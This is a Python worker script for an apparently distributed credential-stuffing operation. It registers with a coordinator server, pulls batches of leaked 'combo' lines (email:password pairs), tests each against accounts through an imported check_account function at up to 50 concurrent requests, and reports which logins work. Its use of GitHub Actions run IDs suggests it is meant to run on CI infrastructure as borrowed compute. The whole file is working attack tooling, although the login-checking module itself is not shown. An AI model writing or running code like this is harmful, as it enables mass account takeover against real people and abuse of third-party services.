import os
import sys
import time
import asyncio
import httpx
import json
from check_engine import check_account

HOST = os.environ.get("COORDINATOR_HOST", "http://127.0.0.1:5000")
WORKER_ID = os.environ.get("GITHUB_RUN_ID", f"local-{int(time.time())}")
REPO = os.environ.get("GITHUB_REPOSITORY", "unknown")
BATCH_SIZE = int(os.environ.get("BATCH_SIZE", "50"))
CONCURRENCY = int(os.environ.get("CONCURRENCY", "50"))
MAX_IDLE_ROUNDS = int(os.environ.get("MAX_IDLE_ROUNDS", "3"))


def safe_print(msg: str):
    print(msg, flush=True)


async def main():
    safe_print(f"[*] Worker starting | ID={WORKER_ID} | Repo={REPO}")
    safe_print(f"[*] Coordinator: {HOST}")

    async with httpx.AsyncClient(timeout=httpx.Timeout(30.0)) as client:
        # Register
        try:
            r = await client.post(f"{HOST}/register", json={"worker_id": WORKER_ID, "repo": REPO})
            safe_print(f"[*] Registered: {r.status_code}")
        except Exception as e:
            safe_print(f"[-] Register failed: {e}")

        idle_rounds = 0
        total_checked = 0

        while idle_rounds < MAX_IDLE_ROUNDS:
            # Fetch batch
            try:
                r = await client.post(f"{HOST}/get_task", json={"worker_id": WORKER_ID, "batch_size": BATCH_SIZE})
                data = r.json()
                combos = data.get("combos", [])
                if data.get("reclaimed", 0):
                    safe_print(f"[*] Coordinator reclaimed {data['reclaimed']} timed-out tasks")
            except Exception as e:
                safe_print(f"[-] get_task error: {e}")
                await asyncio.sleep(5)
                continue

            if not combos:
                idle_rounds += 1
                safe_print(f"[*] No tasks available (idle {idle_rounds}/{MAX_IDLE_ROUNDS})")
                await asyncio.sleep(3)
                continue

            idle_rounds = 0
            safe_print(f"[*] Got batch of {len(combos)} combos")

            # Concurrent check
            sem = asyncio.Semaphore(CONCURRENCY)

            async def check_one(c):
                async with sem:
                    line = c["line"]
                    if ":" not in line:
                        return {"combo_id": c["id"], "status": "error", "result_type": "error", "details": "bad_format"}
                    email, password = line.split(":", 1)
                    try:
                        res = await check_account(email, password)
                    except Exception as e:
                        res = {"status": "error", "result_type": "error", "details": str(e)}
                    return {
                        "combo_id": c["id"],
                        "status": res.get("status", "error"),
                        "result_type": res.get("result_type", "error"),
                        "details": res.get("details", ""),
                    }

            tasks = [check_one(c) for c in combos]
            results = await asyncio.gather(*tasks)
            total_checked += len(results)

            # Submit results
            try:
                r = await client.post(f"{HOST}/submit", json={"worker_id": WORKER_ID, "results": results})
                safe_print(f"[+] Submitted {len(results)} results | Total checked: {total_checked} | HTTP {r.status_code}")
            except Exception as e:
                safe_print(f"[-] Submit error: {e}")

        safe_print(f"[*] Worker exiting after {total_checked} total checks")


if __name__ == "__main__":
    asyncio.run(main())
